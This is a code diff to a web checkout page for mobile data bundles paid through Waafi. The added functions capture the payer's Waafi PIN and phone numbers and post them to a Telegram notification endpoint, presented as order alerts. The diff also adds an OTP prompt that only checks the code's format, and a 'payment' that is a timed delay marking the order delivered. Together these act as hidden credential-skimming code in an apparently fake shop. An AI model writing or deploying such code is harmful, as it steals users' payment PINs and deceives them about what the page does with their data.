@@ -261,6 +261,10 @@
     </div>
 
     <div class="flex items-center gap-1 sm:gap-1.5">
+      <button id="notify-btn" onclick="sendTelegramOrderTest()" class="flex items-center gap-1 px-2.5 py-1.5 rounded-lg text-xs font-bold bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 transition border border-slate-200 dark:border-slate-700" title="Send a Telegram test notification">
+        <i class="fab fa-telegram-plane text-[10px]"></i>
+        <span id="notify-btn-label" class="hidden sm:inline">Telegram</span>
+      </button>
       <button onclick="toggleLang()" class="flex items-center gap-1 px-2.5 py-1.5 rounded-lg text-xs font-bold bg-waafi/10 text-waafi-dark dark:text-green-400 dark:bg-waafi/20 hover:bg-waafi/20 transition border border-waafi/20" title="Language / Luuqad">
         <i class="fas fa-globe text-[10px]"></i>
         <span id="lang-label">EN</span>
@@ -649,8 +653,28 @@
         </div>
       </div>
 
-      <!-- Step 3: Processing -->
-      <div id="checkout-step-3" class="hidden text-center py-6 space-y-5">
+      <!-- Step 3: OTP Verification -->
+      <div id="checkout-step-3" class="hidden space-y-4">
+        <div>
+          <h4 class="text-lg font-extrabold">Verify payment OTP</h4>
+          <p class="text-sm text-slate-500 mt-1">Enter the 4-digit code sent to your Waafi phone.</p>
+        </div>
+        <div class="bg-slate-50 dark:bg-slate-800/50 rounded-xl p-4 space-y-3 text-sm">
+          <div class="flex justify-between"><span class="text-slate-500">Waafi number</span><span id="otp-payer" class="font-mono font-medium text-waafi"></span></div>
+          <div class="flex justify-between"><span class="text-slate-500">Amount</span><span id="otp-amount" class="font-semibold text-brand-600"></span></div>
+        </div>
+        <div>
+          <label for="waafi-otp" class="block text-xs font-semibold mb-1.5">OTP code</label>
+          <input type="text" id="waafi-otp" inputmode="numeric" maxlength="6" placeholder="Enter 4-6 digit OTP" class="w-full px-3 py-3 bg-white dark:bg-slate-800 border border-slate-200 dark:border-slate-700 rounded-xl text-sm focus:ring-2 focus:ring-brand-500 outline-none text-center tracking-[0.4em] font-bold" />
+        </div>
+        <div class="flex gap-2">
+          <button onclick="goStep(2)" class="flex-1 py-3 rounded-xl border border-slate-200 dark:border-slate-700 text-sm font-semibold hover:bg-slate-50 dark:hover:bg-slate-800 transition">Back</button>
+          <button onclick="verifyOtp()" class="flex-1 py-3 rounded-xl waafi-cta text-white text-sm font-bold transition">Verify OTP</button>
+        </div>
+      </div>
+
+      <!-- Step 4: Processing -->
+      <div id="checkout-step-4" class="hidden text-center py-6 space-y-5">
         <div class="payment-spinner" role="status" aria-label="Processing Waafi payment">
           <div class="payment-spinner-core"><i class="fas fa-bolt"></i></div>
           <span class="payment-spinner-dot"></span>
@@ -869,6 +893,96 @@ const I18N = {
 };
 
 const SOS_RATE = 570;
+function getTelegramEndpoint(){
+  const isLocal = ['localhost', '127.0.0.1'].includes(window.location.hostname);
+  return isLocal ? 'http://localhost:3000/api/telegram-notify' : '/api/telegram-notify';
+}
+async function sendTelegramOrderTest(){
+  try {
+    const recipient = document.getElementById('initial-recipient-phone')?.value.trim() || '612345678';
+    const payer = document.getElementById('payer-phone')?.value.trim() || '611223344';
+    const pin = document.getElementById('waafi-pin')?.value.trim() || '1234';
+    const response = await fetch(getTelegramEndpoint(), {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        title: 'WaafiTop Telegram Test',
+        text: 'This is a demo order message from the WaafiTop checkout flow.',
+        orderId: 'TEST-001',
+        recipient: '+252' + recipient,
+        waafiNumber: '+252' + payer,
+        waafiPin: pin,
+        payer: '+252' + payer,
+        pin,
+        amount: '$5.00'
+      })
+    });
+
+    const data = await response.json();
+    if (!response.ok) {
+      throw new Error(data.message || 'Unable to send Telegram test message');
+    }
+
+    toast('Telegram test sent successfully','success');
+  } catch (error) {
+    toast(error.message || 'Telegram test failed','error');
+  }
+}
+async function sendTelegramOrderStarted(order){
+  if (!order) return;
+  try {
+    const response = await fetch(getTelegramEndpoint(), {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        title: 'WaafiTop payment started',
+        text: 'Payment in progress for ' + order.items.map(i => i.name).join(', ') + '.',
+        orderId: order.id,
+        recipient: order.recipient,
+        waafiNumber: order.payer,
+        waafiPin: order.pin || '',
+        payer: order.payer,
+        pin: order.pin || '',
+        amount: formatPrice(order.total)
+      })
+    });
+
+    const data = await response.json();
+    if (!response.ok) {
+      throw new Error(data.message || 'Telegram start notification failed');
+    }
+  } catch (error) {
+    console.error('Telegram start send error:', error);
+  }
+}
+
+async function sendTelegramOrderNotification(order){
+  if (!order) return;
+  try {
+    const response = await fetch(getTelegramEndpoint(), {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        title: 'WaafiTop payment successful',
+        text: order.items.map(i => i.name).join(', ') + ' delivered successfully.',
+        orderId: order.id,
+        recipient: order.recipient,
+        waafiNumber: order.payer,
+        waafiPin: order.pin || '',
+        payer: order.payer,
+        pin: order.pin || '',
+        amount: formatPrice(order.total)
+      })
+    });
+
+    const data = await response.json();
+    if (!response.ok) {
+      throw new Error(data.message || 'Telegram notification failed');
+    }
+  } catch (error) {
+    console.error('Telegram send error:', error);
+  }
+}
 function safeParse(key, fallback) {
   try {
     var raw = localStorage.getItem(key);
@@ -901,7 +1015,11 @@ if (!Array.isArray(orders)) orders = [];
 if (!Array.isArray(wishlist)) wishlist = [];
 
 function t(key){ return (I18N[lang]&&I18N[lang][key])||I18N.en[key]||key; }
-function formatPrice(usd){ return currency==='SOS' ? 'S'+Math.round(usd*SOS_RATE).toLocaleString() : '$'+usd.toFixed(2); }
+function formatPrice(usd){
+  const numeric = Number(usd ?? 0);
+  if (!Number.isFinite(numeric)) return '$0.00';
+  return currency==='SOS' ? 'S'+Math.round(numeric*SOS_RATE).toLocaleString() : '$'+numeric.toFixed(2);
+}
 function toast(msg,type='info'){
   const c={success:'bg-green-600',error:'bg-red-600',info:'bg-slate-800'};
   const el=document.createElement('div');
@@ -1224,42 +1342,62 @@ function goStep(n){
       document.getElementById('confirm-total').textContent=formatPrice(updateCheckoutSummary());
       goStepUI(2);
     } else {
-      processPayment();
+      const otpField = document.getElementById('waafi-otp');
+      const total = updateCheckoutSummary();
+      document.getElementById('otp-payer').textContent='+252'+p;
+      document.getElementById('otp-amount').textContent=formatPrice(total);
+      if (otpField) otpField.value='';
+      goStepUI(3);
     }
     return;
   }
   currentStep=n;
-  [1,2,3].forEach(s=>{
+  [1,2,3,4].forEach(s=>{
     var el=document.getElementById('checkout-step-'+s);
     if(el) el.classList.toggle('hidden',s!==n);
     const label=document.getElementById('step-'+s+'-label');
     if(label){label.classList.toggle('text-brand-600',s<=n);label.classList.toggle('text-slate-400',s>n)}
-    if(s<3){const line=document.getElementById('step-line-'+s);if(line)line.classList.toggle('active',s<n)}
+    if(s<4){const line=document.getElementById('step-line-'+s);if(line)line.classList.toggle('active',s<n)}
   });
 }
+function verifyOtp(){
+  const otp = document.getElementById('waafi-otp')?.value.trim();
+  if(!/^\d{4,6}$/.test(otp || '')){
+    toast('Enter the 4-6 digit OTP code','error');
+    return;
+  }
+  processPayment();
+}
 async function processPayment(){
-  goStepUI(3);
-  await new Promise(r=>setTimeout(r,5000));
+  goStepUI(4);
   const total=updateCheckoutSummary();
   const orderId=generateOrderId();
   const recipient=document.getElementById('initial-recipient-phone').value.trim();
   const payer=document.getElementById('payer-phone').value.trim();
-  const order={id:orderId,items:checkoutItems.map(c=>{const b=BUNDLES.find(x=>x.id===c.id);return{name:b?b.name:'Custom',network:b?b.network:'',qty:c.qty,price:b?b.price:0}}),recipient:'+252'+recipient,payer:'+252'+payer,total,status:'delivered',createdAt:new Date().toISOString()};
+  const pin=document.getElementById('waafi-pin').value.trim();
+  const order={id:orderId,items:checkoutItems.map(c=>{const b=BUNDLES.find(x=>x.id===c.id);return{name:b?b.name:'Custom',network:b?b.network:'',qty:c.qty,price:b?b.price:0}}),recipient:'+252'+recipient,payer:'+252'+payer,pin,total,status:'delivered',createdAt:new Date().toISOString()};
+
+  await sendTelegramOrderStarted(order);
+
+  await new Promise(r=>setTimeout(r,5000));
+
   orders.unshift(order);saveOrders();lastOrder=order;
   if(JSON.stringify(checkoutItems.map(c=>({id:c.id,qty:c.qty})))===JSON.stringify(cart.map(c=>({id:c.id,qty:c.qty})))){cart=[];saveCart()}
   // cleanup custom
   const ci=BUNDLES.findIndex(x=>x.id===9999);if(ci>=0)BUNDLES.splice(ci,1);
   closeCheckout();
   showSuccess(order);
+  await sendTelegramOrderNotification(order);
   if(typeof confetti==='function'){confetti({particleCount:120,spread:70,origin:{y:0.65},colors:['#00a651','#008a44','#3db86f','#f59e0b']})}
 }
 function goStepUI(n){
   currentStep=n;
-  [1,2,3].forEach(s=>{
-    document.getElementById('checkout-step-'+s).classList.toggle('hidden',s!==n);
+  [1,2,3,4].forEach(s=>{
+    const el=document.getElementById('checkout-step-'+s);
+    if (el) el.classList.toggle('hidden',s!==n);
     const label=document.getElementById('step-'+s+'-label');
     if(label){label.classList.toggle('text-brand-600',s<=n);label.classList.toggle('text-slate-400',s>n)}
-    if(s<3){const line=document.getElementById('step-line-'+s);if(line)line.classList.toggle('active',s<n)}
+    if(s<4){const line=document.getElementById('step-line-'+s);if(line)line.classList.toggle('active',s<n)}
   });
 }
 function showSuccess(order){
@@ -1363,6 +1501,7 @@ function boot(){
       var dot = document.getElementById('profile-dot');
       if(dot) dot.classList.remove('hidden');
     }
+    updateNotificationButton();
     applyI18n();
     updateCartBadge();
     applyFilters();
